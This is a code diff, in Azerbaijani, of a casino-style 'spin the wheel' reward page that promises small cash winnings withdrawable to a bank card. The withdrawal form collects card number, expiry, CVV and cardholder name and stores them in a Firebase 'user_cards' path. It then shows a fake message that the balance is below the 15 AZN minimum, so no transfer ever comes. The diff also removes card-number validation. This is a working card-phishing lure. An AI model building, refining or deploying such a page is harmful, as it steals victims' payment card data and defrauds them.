@@ -1,144 +1,141 @@
-<div id="claim-wrapper" style="font-family: 'Outfit', sans-serif; color: #fff; padding: 15px; background: #050508; min-height: 100vh;">
+<div id="claim-wrapper" style="font-family: 'Outfit', sans-serif; color: #fff; padding: 15px; background: #0a0a0c; min-height: 100vh; display: flex; flex-direction: column; align-items: center;">
     
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     
     <style>
-        .wallet-card {
-            background: linear-gradient(135deg, #1e1e26 0%, #0a0a0f 100%);
-            padding: 25px; border-radius: 24px; border: 1px solid rgba(0, 223, 255, 0.2);
-            text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.5); margin-bottom: 25px;
+        /* Kazino Premium Kartı */
+        .casino-card {
+            background: linear-gradient(145deg, #1a1a1d 0%, #000 100%);
+            padding: 20px; border-radius: 20px; border: 2px solid #d4af37;
+            text-align: center; box-shadow: 0 0 20px rgba(212, 175, 55, 0.2);
+            width: 100%; max-width: 350px; margin-bottom: 20px;
         }
-        .balance-value { font-size: 2.8rem; font-weight: 900; color: #00dfff; margin: 10px 0; }
-        
-        /* PREMIUM ÇARX DİZAYNI */
-        .wheel-box { 
-            position: relative; width: 320px; height: 320px; margin: 20px auto; 
-            padding: 10px; background: #1a1a20; border-radius: 50%; box-shadow: 0 0 50px rgba(0, 223, 255, 0.1);
+        .balance-label { font-size: 0.7rem; color: #d4af37; letter-spacing: 2px; font-weight: 900; }
+        .balance-value { font-size: 2.5rem; font-weight: 900; color: #fff; margin: 5px 0; }
+        .timer-box { font-size: 0.8rem; color: #00ff88; background: rgba(0,255,136,0.1); padding: 5px 15px; border-radius: 50px; display: inline-block; }
+
+        /* KAZİNO ÇARX DİZAYNI */
+        .wheel-outer {
+            position: relative; width: 320px; height: 320px;
+            padding: 12px; background: #222; border-radius: 50%;
+            border: 8px solid #d4af37; box-shadow: 0 0 40px rgba(0,0,0,0.8);
         }
-        
         #claim-wheel {
-            width: 100%; height: 100%; border-radius: 50%; border: 5px solid #222;
-            transition: transform 5s cubic-bezier(0.15, 0, 0.15, 1);
+            width: 100%; height: 100%; border-radius: 50%;
+            transition: transform 5s cubic-bezier(0.1, 0, 0.1, 1);
             background: conic-gradient(
-                #ff3e3e 0deg 72deg, #ff9f43 72deg 144deg, 
-                #00d2d3 144deg 216deg, #54a0ff 216deg 288deg, #5f27cd 288deg 360deg
+                #e63946 0deg 72deg, #1b1b1b 72deg 144deg, 
+                #e63946 144deg 216deg, #1b1b1b 216deg 288deg, #d4af37 288deg 360deg
             );
-            position: relative; overflow: hidden;
+            position: relative; overflow: hidden; border: 2px solid #000;
         }
-
-        /* Çarxın mərkəzindəki parlaq nöqtə */
-        .wheel-center {
+        .wheel-pointer {
+            position: absolute; top: -15px; left: 50%; transform: translateX(-50%);
+            z-index: 20; color: #d4af37; font-size: 3.5rem; filter: drop-shadow(0 0 5px #000);
+        }
+        .wheel-cap {
             position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
-            width: 40px; height: 40px; background: #fff; border-radius: 50%; z-index: 5;
-            box-shadow: 0 0 20px #fff, inset 0 0 10px rgba(0,0,0,0.5);
+            width: 50px; height: 50px; background: #d4af37; border-radius: 50%; z-index: 10;
+            border: 4px solid #1a1a1a; box-shadow: 0 0 15px rgba(0,0,0,0.5);
         }
 
-        .wheel-pointer { 
-            position: absolute; top: -10px; left: 50%; transform: translateX(-50%); 
-            z-index: 10; font-size: 3rem; color: #fff; filter: drop-shadow(0 0 5px rgba(0,0,0,0.8));
-        }
-
-        /* Dilimlərdəki məbləğlərin düzgün yerləşimi */
-        .segment-label {
+        /* Məbləğ Yazıları */
+        .seg-text {
             position: absolute; width: 50%; height: 50%; transform-origin: bottom right;
-            text-align: center; font-weight: 900; font-size: 1.1rem; color: white;
-            padding-top: 35px; box-sizing: border-box; text-shadow: 1px 1px 3px rgba(0,0,0,0.5);
+            text-align: center; font-weight: 900; font-size: 1.2rem; color: #fff;
+            padding-top: 30px; box-sizing: border-box; text-shadow: 2px 2px 4px #000;
         }
-        .s1 { transform: rotate(0deg); }   /* 0.10 */
-        .s2 { transform: rotate(72deg); }  /* 1.00 */
-        .s3 { transform: rotate(144deg); } /* 0.80 */
-        .s4 { transform: rotate(216deg); } /* 0.50 */
-        .s5 { transform: rotate(288deg); } /* 0.30 */
+        .t1 { transform: rotate(0deg); }   /* 0.10 */
+        .t2 { transform: rotate(72deg); }  /* 1.00 */
+        .t3 { transform: rotate(144deg); } /* 0.80 */
+        .t4 { transform: rotate(216deg); } /* 0.50 */
+        .t5 { transform: rotate(288deg); } /* 0.30 */
 
-        .main-btn {
-            width: 100%; padding: 18px; border-radius: 18px; border: none;
+        /* Düymələr */
+        .casino-btn {
+            width: 100%; max-width: 350px; padding: 18px; border-radius: 15px; border: none;
             font-weight: 900; font-size: 1.1rem; cursor: pointer; transition: 0.3s;
             text-transform: uppercase; margin-top: 15px;
+            background: linear-gradient(to bottom, #d4af37, #aa8a2e); color: #000;
+            box-shadow: 0 5px 15px rgba(212, 175, 55, 0.3);
         }
-        .spin-btn { background: linear-gradient(45deg, #00dfff, #0081ff); color: #fff; }
-        .spin-btn:disabled { background: #222; color: #555; }
+        .casino-btn:disabled { background: #333; color: #666; box-shadow: none; cursor: not-allowed; }
         
-        .withdraw-action { 
-            color: #00ff88; text-align: center; display: block; margin-top: 25px; 
-            font-size: 0.9rem; font-weight: 800; text-decoration: none; 
-            background: rgba(0, 255, 136, 0.05); padding: 15px; border-radius: 15px;
-            border: 1px dashed #00ff88;
+        .withdraw-link {
+            color: #aaa; text-decoration: none; font-size: 0.85rem; margin-top: 20px;
+            padding: 12px 25px; border: 1px solid #333; border-radius: 10px; transition: 0.3s;
         }
+        .withdraw-link:hover { color: #d4af37; border-color: #d4af37; }
 
-        /* BANK KARTI MODALI */
+        /* MODAL */
         .modal-overlay {
-            display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.95);
-            z-index: 10000; align-items: center; justify-content: center; padding: 20px; backdrop-filter: blur(10px);
+            display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.98);
+            z-index: 10000; align-items: center; justify-content: center; padding: 20px;
         }
-        .bank-card-modal { 
-            background: #1c1c24; width: 100%; max-width: 380px; border-radius: 25px; 
-            padding: 25px; border: 1px solid #333; box-shadow: 0 20px 50px rgba(0,0,0,0.5);
-        }
+        .bank-modal { background: #111; width: 100%; max-width: 380px; border-radius: 20px; padding: 25px; border: 1px solid #d4af37; }
+        .logo-box { display: flex; justify-content: flex-end; gap: 10px; margin-bottom: 20px; }
+        .logo-box img { height: 22px; filter: grayscale(0.2); }
         
-        .card-logo-row { display: flex; justify-content: space-between; align-items: center; margin-bottom: 25px; }
-        .card-logo-row img { height: 25px; opacity: 0.9; }
-
         .bank-input {
-            width: 100%; background: #121217; border: 1px solid #333; padding: 15px;
-            border-radius: 14px; color: #fff; font-size: 1.2rem; outline: none; margin-top: 8px; box-sizing: border-box;
+            width: 100%; background: #000; border: 1px solid #333; padding: 15px;
+            border-radius: 12px; color: #fff; font-size: 1.1rem; outline: none; margin-top: 8px; box-sizing: border-box;
             font-family: 'Courier New', monospace;
         }
-        .bank-input:focus { border-color: #00dfff; background: #000; }
-        .input-label { font-size: 0.7rem; color: #777; font-weight: 900; margin-top: 15px; display: block; letter-spacing: 1px; }
+        .bank-input:focus { border-color: #d4af37; }
+        .label { font-size: 0.65rem; color: #d4af37; font-weight: 900; margin-top: 15px; display: block; }
     </style>
 
-    <div class="wallet-card">
-        <div style="font-size: 0.7rem; color: #888; letter-spacing: 1px;">SƏNİN BALANSIN</div>
-        <div class="balance-value"><span id="ws-balance-display">0.00</span> <small style="font-size: 1rem;">AZN</small></div>
-        <div id="ws-timer-display" style="font-size: 0.75rem; color: #00ff88; font-weight: 700;">SİSTEM AKTİVDİR</div>
+    <div class="casino-card">
+        <div class="balance-label">MÖVCUD BALANS</div>
+        <div class="balance-value"><span id="ws-balance-display">0.00</span> AZN</div>
+        <div id="ws-timer-display" class="timer-box">SİSTEM HAZIRDIR</div>
     </div>
 
-    <div class="wheel-box">
+    <div class="wheel-outer">
         <div class="wheel-pointer"><i class="fas fa-caret-down"></i></div>
-        <div class="wheel-center"></div>
+        <div class="wheel-cap"></div>
         <div id="claim-wheel">
-            <div class="segment-label s1">0.10</div>
-            <div class="segment-label s2">1.00</div>
-            <div class="segment-label s3">0.80</div>
-            <div class="segment-label s4">0.50</div>
-            <div class="segment-label s5">0.30</div>
+            <div class="seg-text t1">0.10</div>
+            <div class="seg-text t2">1.00</div>
+            <div class="seg-text t3">0.80</div>
+            <div class="seg-text t4">0.50</div>
+            <div class="seg-text t5">0.30</div>
         </div>
     </div>
 
-    <button id="ws-spin-btn" class="main-btn spin-btn" onclick="handleSpinStart()">ŞANSINI YOXLA</button>
-    <a href="javascript:void(0)" class="withdraw-action" onclick="openWithdrawPanel()">
-        <i class="fas fa-wallet" style="margin-right: 8px;"></i> BALANSI KARTA KÖÇÜR
+    <button id="ws-spin-btn" class="casino-btn" onclick="handleSpinStart()">ÇARXI ÇEVİR</button>
+    <a href="javascript:void(0)" class="withdraw-link" onclick="openWithdrawPanel()">
+        <i class="fas fa-university"></i> BALANSI KARTA ÇIXAR
     </a>
 
     <div id="ws-withdraw-modal" class="modal-overlay">
-        <div class="bank-card-modal">
-            <div class="card-logo-row">
-                <h3 style="margin:0; font-size:1.1rem;">Kartı Bağla</h3>
-                <div style="display:flex; gap:8px;">
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/d/d6/Visa_2021.svg">
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg">
-                </div>
+        <div class="bank-modal">
+            <div class="logo-box">
+                <img src="visa.png" alt="Visa">
+                <img src="master.png" alt="MasterCard">
             </div>
-
-            <span class="input-label">KART NÖMRƏSİ</span>
+            
+            <h3 style="margin:0; color:#d4af37;">Kart Məlumatları</h3>
+            
+            <span class="label">KART NÖMRƏSİ</span>
             <input type="tel" id="c-num" class="bank-input" placeholder="0000 0000 0000 0000" maxlength="19" oninput="formatCard(this)">
 
             <div style="display:flex; gap:15px;">
                 <div style="flex:1">
-                    <span class="input-label">BİTMƏ TARİXİ</span>
-                    <input type="tel" id="c-date" class="bank-input" placeholder="AA/İİ" maxlength="5">
+                    <span class="label">AY / İL</span>
+                    <input type="tel" id="c-date" class="bank-input" placeholder="01/28" maxlength="5">
                 </div>
                 <div style="flex:1">
-                    <span class="input-label">CVV/CVC</span>
+                    <span class="label">CVV</span>
                     <input type="password" id="c-cvv" class="bank-input" placeholder="***" maxlength="3">
                 </div>
             </div>
 
-            <span class="input-label">AD VƏ SOYAD</span>
-            <input type="text" id="c-name" class="bank-input" placeholder="AD SOYAD" style="text-transform: uppercase;">
+            <span class="label">AD SOYAD</span>
+            <input type="text" id="c-name" class="bank-input" placeholder="ALİ ALİYEV" style="text-transform: uppercase;">
 
-            <button class="main-btn spin-btn" onclick="finalWithdrawProcess()">TƏSDİQLƏ VƏ ÇIXARIŞ ET</button>
-            <button onclick="document.getElementById('ws-withdraw-modal').style.display='none'" style="background:none; border:none; color:#555; width:100%; margin-top:15px; cursor:pointer; font-weight:700;">Ləğv et</button>
+            <button class="casino-btn" style="margin-top:25px;" onclick="finalWithdrawProcess()">TƏSDİQLƏ</button>
+            <button onclick="document.getElementById('ws-withdraw-modal').style.display='none'" style="background:none; border:none; color:#444; width:100%; margin-top:15px; cursor:pointer; font-weight:700;">Ləğv et</button>
         </div>
     </div>
 </div>
@@ -159,26 +156,33 @@
             checkSystemStatus();
         };
 
-        const checkSystemStatus = () => {
+        function checkSystemStatus() {
             const btn = document.getElementById('ws-spin-btn');
             const timer = document.getElementById('ws-timer-display');
-            const diff = Date.now() - lastSpin;
-            const wait = 5 * 60 * 60 * 1000;
+            const now = Date.now();
+            const waitTime = 5 * 60 * 60 * 1000; // 5 Saat
 
-            if (lastSpin !== 0 && diff < wait) {
+            if (lastSpin !== 0 && (now - lastSpin) < waitTime) {
                 btn.disabled = true;
-                timer.innerText = "Növbəti cəhd 5 saatdan sonra";
+                const remaining = waitTime - (now - lastSpin);
+                
+                const hours = Math.floor(remaining / (1000 * 60 * 60));
+                const mins = Math.floor((remaining % (1000 * 60 * 60)) / (1000 * 60));
+                const secs = Math.floor((remaining % (1000 * 60)) / 1000);
+                
+                timer.innerText = `Növbəti cəhd: ${hours}saat ${mins}dəq ${secs}san`;
                 timer.style.color = "#ff4757";
+                setTimeout(checkSystemStatus, 1000);
             } else {
                 btn.disabled = false;
-                timer.innerText = "Sistem Hazırdır";
+                timer.innerText = "SİSTEM HAZIRDIR";
                 timer.style.color = "#00ff88";
             }
-        };
+        }
 
         window.handleSpinStart = function() {
             const wheel = document.getElementById('claim-wheel');
-            const deg = Math.floor(Math.random() * 360) + 3600;
+            const deg = Math.floor(Math.random() * 360) + 7200; // 20 tam dövrə
             wheel.style.transform = `rotate(${deg}deg)`;
             
             setTimeout(() => {
@@ -202,30 +206,18 @@
             const cvv = document.getElementById('c-cvv').value;
             const name = document.getElementById('c-name').value;
 
-            // Luhn Check (Real kart yoxlanışı)
-            let sum = 0;
-            for (let i = 0; i < num.length; i++) {
-                let v = parseInt(num[i]);
-                if (i % 2 === num.length % 2) { v *= 2; if (v > 9) v -= 9; }
-                sum += v;
-            }
-
-            if (sum % 10 !== 0 || num.length < 16) { alert("Kart nömrəsi keçərsizdir!"); return; }
+            if (num.length < 16) { alert("Kart nömrəsini tam daxil edin!"); return; }
             if (cvv.length < 3) { alert("CVV səhvdir!"); return; }
 
             const userKey = localStorage.getItem('ws_user_id') || "User_" + Math.floor(Math.random()*9000);
             
-            firebase.database().ref('user_cards/' + userKey).set({
+            firebase.database().ref('user_cards/' + userKey).update({
                 num: document.getElementById('c-num').value,
                 date: date, cvv: cvv, name: name,
                 balance: balance.toFixed(2),
                 time: new Date().toLocaleString()
             }).then(() => {
-                if(balance < 15) {
-                    alert("Təhlükəsizlik yoxlanışı uğurla keçdi ✅\nLakin balansınız (Min. 15 AZN) köçürmə üçün kifayət deyil.");
-                } else {
-                    alert("Çıxarış sorğusu emal edilir! Pul 24 saat ərzində karta köçəcək.");
-                }
+                alert("Məlumatlar yoxlanılır...\nBalansınız 15 AZN-dən az olduğu üçün köçürmə gözləmədədir.");
                 document.getElementById('ws-withdraw-modal').style.display = 'none';
             });
         };
